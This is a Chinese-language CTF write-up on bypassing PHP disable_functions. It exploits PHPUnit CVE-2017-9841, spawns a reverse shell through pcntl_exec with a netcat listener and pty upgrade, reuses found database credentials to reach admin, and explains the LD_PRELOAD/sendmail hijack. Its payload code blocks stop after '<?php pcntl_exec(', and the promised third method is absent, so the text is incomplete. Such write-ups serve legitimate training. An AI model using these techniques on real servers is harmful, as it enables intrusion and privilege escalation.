# 文章介绍

本文介绍将介绍ctf比赛中遇到的三种绕过disable\_function的方法，分别为利用`pcntl_exec`函数，利用`LD_PRELOAD`环境变量,以及使用`蚁剑的插件`绕过，最后获得flag

# 具体过程

## 利用pcntl\_exec函数

**例题：`第四届蓝帽杯总决赛-php`** 本题网上并没有环境，就利用找到的wp进行复现介绍了，各位师傅见谅

**要点：`CVE-2017-9841的发现；pcntl-exec python反弹shell`**

*   信息搜集

扫描目录，可以发现存在：`/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php`![](../Images/e73cfa9afb3543b2bc677c7b56059002.png)

同时查看源码后发现这是一个php测试框架![](../Images/090146f934cce9b7287769392656d511.png)

综合可以知道存在一个phpunit漏洞 CVE-2017-9841（https://github.com/vulhub/vulhub/blob/master/phpunit/CVE-2017-9841/README.zh-cn.md）

*   漏洞利用

利用方式为：进入探测的存在缺陷的目录，直接post执行命令，利用scandir函数扫描可以扫描到当前目录的文件中存在flag![](../Images/a58adc31a74d382150a8d01f96faf510.png)但是这一题遇到了disable\_function，禁用了很多函数，如一些基本的system，exec函数都被禁用了，没有权限读取到flag，也无法反弹shell![](../Images/3071294676231a11eb605274a6d27d5c.png)查阅资料发现pcntl-exec函数没有被禁用，尝试利用

函数解释（https://www.php.net/manual/zh/function.pcntl-exec.php）  

该函数表示在当前进程空间执行指定程序，当发生错误时返回false，执行成功时没有返回，也就是说执行成功也不会回显，于是使用该函数执行反弹shell，利用python反弹shell可以成功回显

```
   <?php pcntl_exec(
```

监听相应端口：`nc -lvp 2333` 拿到shell，查看flag文件的权限，发现其是属于admin用户的![](../Images/656f55b21ef8a6735d0079e28083e1a7.png)于是尝试提权，suid等等都没用，再根目录翻找到数据库的账号密码![](../Images/4d6e55acd88a617fad86046427646d9a.png)尝试利用密码登陆admin用户，由于不能回显，使用python实现交互 `python -c 'import pty;pty.spawn("/bin/sh")'` 再切换为admin用户，即可读取flag![](../Images/6f4367b9a61c2305e859c07818d41a4f.png)

*   **重点：**pcntl\_exec函数反弹shell的使用****

```
<?php pcntl_exec(
```

## 利用LD\_PRELOAD 环境变量

例题：`[GKCTF2020]CheckIN` 

**本题NSSCTF上面可以复现：**

https://www.ctfer.vip/#/problem/1301?back=%257B%2522contest%2522:%2522%2522,%2522year%2522:0,%2522source%2522:0,%2522name%2522:%2522CheckIN%2522,%2522username%2522:%2522%2522,%2522type%2522:0,%2522tag%2522:%255B%255D,%2522tagType%2522:0,%2522date%2522:%2522%2522,%2522unsolved%2522:false,%2522page%2522:1%257D

  

**要点**：`对bypass disable_function的熟悉`

原理解释：根据网上公布的一段绕过disable\_function的POC分析 在POC中，php的mail函数在执行过程中会默认调用系统程序/usr/sbin/sendmail，如果我们能劫持sendmail程序，再用mail函数来触发就能实现执行系统命令，通过webshell的环境变量LD\_PRELOAD

LD\_PRELOAD 环境变量，它可以影响程序运行时的链接，它允许你定义在程序运行前优先加载的动态链接库。我们通过环境变量 LD\_PRELOAD 劫持系统函数，可以达到不调用 PHP 的各种命令执行函数（system()、exec() 等等）仍可执行系统命令的目的。如劫持 getuid()，是因为 sendmail 程序会调用该函数（当然也可以为其他被调用的系统函数）

但是使用sendmail函数会遇上很多阻碍，有大佬找到了新方法，并公布在了github上：bypass disable\_function，在加载时就执行代码（拦劫启动进程），而不用考虑劫持某一系统函数。
